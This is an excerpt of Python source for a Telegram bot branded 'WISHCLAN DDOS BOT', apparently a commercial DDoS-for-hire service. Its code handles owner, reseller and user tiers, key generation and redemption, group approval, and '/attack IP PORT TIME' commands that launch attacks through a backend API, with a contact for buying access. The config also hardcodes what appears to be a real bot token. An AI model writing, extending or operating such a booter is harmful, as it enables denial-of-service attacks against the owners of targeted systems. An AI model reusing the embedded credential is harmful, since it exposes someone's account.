...
# ========== CONFIG ==========
BOT_TOKEN = "8768909788:AAGHEqo9l5uR9yngiPjBAbhKP-B_S8VxRh4"
...
def start(msg):
    ...
    if chat_type == "group" or chat_type == "supergroup":
        ...
        if attack_time:
            bot.reply_to(msg, "✨ WISHCLAN DDOS BOT - GROUP ✨\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
        else:
            bot.reply_to(msg, "❌ Group not approved! Contact: " + BUY_CONTACT)
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, "👑 WISHCLAN DDOS BOT - OWNER 👑\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n\n🛒 Buy: " + BUY_CONTACT)
    elif uid in resellers:
        bot.reply_to(msg, "💎 WISHCLAN DDOS BOT - RESELLER 💎\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys\n\n🛒 Buy: " + BUY_CONTACT)
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, "🔥 WISHCLAN DDOS BOT - USER 🔥\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY\n\n🛒 Buy: " + BUY_CONTACT)
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY\n\n🛒 Buy access: " + BUY_CONTACT)
        ...
        while retry < 3:
            try:
                ...
                if retry < 3:
                    time.sleep(2)
                    continue
                bot.send_message(msg.chat.id, "❌ Attack failed! API offline.\n\n🛒 Contact: " + BUY_CONTACT)
...
def help_cmd(msg):
    ...
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, "✨ WISHCLAN GROUP HELP ✨\n\n/attack IP PORT - Launch attack\n/help - This menu\n/start - Bot info")
    elif uid in ADMIN_ID:
        bot.reply_to(msg, "👑 WISHCLAN OWNER HELP 👑\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n\n🛒 Buy: " + BUY_CONTACT)
    elif uid in resellers:
        bot.reply_to(msg, "💎 WISHCLAN RESELLER HELP 💎\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys\n\n🛒 Buy: " + BUY_CONTACT)
    elif uid in users:
        bot.reply_to(msg, "🔥 WISHCLAN USER HELP 🔥\n\n/attack IP PORT TIME\n/status\n/redeem KEY\n\n🛒 Buy: " + BUY_CONTACT)
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY\n\n🛒 Buy: " + BUY_CONTACT)
